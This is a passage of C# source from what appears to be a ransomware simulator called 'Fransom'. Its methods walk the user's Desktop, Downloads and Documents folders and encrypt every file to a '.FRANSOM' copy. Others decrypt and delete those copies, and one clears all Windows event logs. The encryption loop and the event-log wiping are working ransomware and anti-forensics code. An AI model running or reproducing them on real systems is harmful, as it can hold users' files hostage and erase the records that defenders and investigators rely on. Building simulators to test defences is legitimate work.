            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Downloads"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Documents"), "*.*", true);

            foreach (object obj in stringCollection)
            {
                string file_name = obj.ToString();
                Logger.WriteLine("Encrypting object: " + file_name, SensitiveData);
                string enc_file = file_name + ".FRANSOM";
                EncryptFile(file_name, enc_file, password);
            }
        }

        private static void DecryptUserProfile()
        {
            StringCollection stringCollection = new StringCollection();
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Downloads"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Documents"), "*.*", true);

            foreach (object obj in stringCollection)
            {
                string file_name = obj.ToString();
                string file_path = @file_name;
                if (Path.GetExtension(file_path) == ".FRANSOM")
                {
                    Logger.WriteLine("Decrypting object: " + file_name, SensitiveData);
                    string dec_file = Path.GetDirectoryName(file_name) + "\\" + Path.GetFileNameWithoutExtension(file_name);
                    DecryptFile(file_name, dec_file.ToString(), password);
                }
            }
        }

        private static void CleanupUserProfile()
        {

            string folder_path = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop\\") + "Fransom";
            if (Directory.Exists(folder_path))
            {
                Logger.WriteLine("Found local dummy folder, removing it...");
                CleanupDummyFolder(folder_path);
                Logger.WriteLine("Local dummy folder deleted.");
            }
            Logger.WriteLine("");
            StringCollection stringCollection = new StringCollection();
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Downloads"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Documents"), "*.*", true);


            foreach (object obj in stringCollection)
            {
                try
                {
                    string file_name = obj.ToString();
                    string file_path = @file_name;
                    if (Path.GetExtension(file_path) == ".FRANSOM" || Path.GetExtension(file_path) == ".dec")
                    {
                        Logger.WriteLine("Removing object: " + file_name, SensitiveData);
                        File.Delete(file_path);
                    }
                }
                catch (Exception e)
                {
                    Logger.WriteLine("[-] Error: " + e.Message);
                }
            }
        }

        public void DeleteEventLogs()
        {
            foreach (var log in EventLog.GetEventLogs())
            {
                try
                {
                    Logger.WriteLine("Deleting " + log.LogDisplayName);
                    log.Clear();
                    log.Dispose();

                }
                catch (Exception e)
                {
                    Logger.WriteLine(String.Format("[-] Error: {0} (maybe try as admin).", e.Message));
                }
            }
            Logger.WriteLine("Done, all event logs gone!");
        }

    }
}
